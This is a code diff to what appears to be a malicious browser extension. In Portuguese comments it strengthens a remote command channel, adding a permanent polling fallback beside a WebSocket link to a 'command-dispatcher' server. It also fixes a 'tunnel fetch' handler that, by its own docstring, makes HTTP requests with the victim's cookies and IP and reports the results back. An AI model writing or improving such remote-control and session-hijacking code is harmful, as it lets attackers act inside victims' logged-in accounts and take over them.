@@ -177,6 +177,10 @@ async function initializeExtension() {
   
   log('info', `📊 Configuration loaded - Machine ID: ${machineId}, Monitoring: ${monitoringEnabled ? '✅ ENABLED' : '❌ DISABLED'}`);
   
+  // ✅ CRÍTICO: Iniciar polling de comandos (fallback permanente)
+  log('debug', '📋 Iniciando polling de comandos...');
+  startCommandQueuePoller();
+  
   // If migrated, reconnect WebSocket with new machine_id
   if (needsMigration) {
     log('info', '🔌 Machine ID migrated - reconnecting WebSocket...');
@@ -1197,13 +1201,6 @@ async function processOfflineQueue() {
 // Initialize remote control WebSocket connection
 let commandQueuePollerInterval = null;
 
-async function initializeRemoteControl() {
-  if (!machineId) return;
-  connectToCommandServer();
-  startSessionHeartbeat();
-  startCommandQueuePoller();
-}
-
 // Start polling command queue for pending commands (fallback for offline WebSocket)
 let pollingInterval = 3000; // Start with 3s, adjust dynamically
 
@@ -1300,6 +1297,12 @@ function initializeRemoteControl() {
     log('warn', '⚠️ Machine ID não configurado, tentando novamente em 5s...');
     setTimeout(initializeRemoteControl, 5000);
     return;
+  }
+  
+  // ✅ GARANTIR: Polling sempre ativo (fallback paralelo ao WebSocket)
+  if (!commandQueuePollerInterval) {
+    log('debug', '📋 Garantindo polling ativo...');
+    startCommandQueuePoller();
   }
   
   const wsUrl = `wss://vxvcquifgwtbjghrcjbp.functions.supabase.co/functions/v1/command-dispatcher`;
@@ -1979,16 +1982,20 @@ async function closeOffscreenDocument() {
  * Faz requisições HTTP usando cookies da vítima + IP da vítima
  */
 async function handleTunnelFetchCommand(data) {
-  const { command_id, target_url, method, headers, body, follow_redirects } = data.payload || {};
+  const payload = data.payload || {};
+  const { target_url, method, headers, body, follow_redirects } = payload;
+  
+  // ✅ CORREÇÃO: command_id pode vir em data.command_id OU data.payload.command_id
+  const effectiveId = payload.command_id || data.command_id;
   
   // ✅ Validação crítica: command_id deve existir
-  if (!command_id) {
+  if (!effectiveId) {
     log('error', '❌ [TUNNEL] command_id não fornecido', data);
     return;
   }
   
   log('info', `🌐 [TUNNEL] Requisição recebida`, {
-    command_id,
+    command_id: effectiveId,
     url: target_url,
     method: method || 'GET'
   });
@@ -2199,17 +2206,17 @@ async function handleTunnelFetchCommand(data) {
     // ENVIAR RESULTADO PARA EDGE FUNCTION
     // ══════════════════════════════════════════════════════
     
-    await sendTunnelResult(command_id, result);
+    await sendTunnelResult(effectiveId, result);
     
   } catch (error) {
     log('error', `❌ [TUNNEL] Erro na requisição`, {
-      command_id,
+      command_id: effectiveId,
       url: target_url,
       error: error.message,
       stack: error.stack
     });
     
-    await sendTunnelResult(command_id, {
+    await sendTunnelResult(effectiveId, {
       success: false,
       error: error.message,
       error_type: error.name,
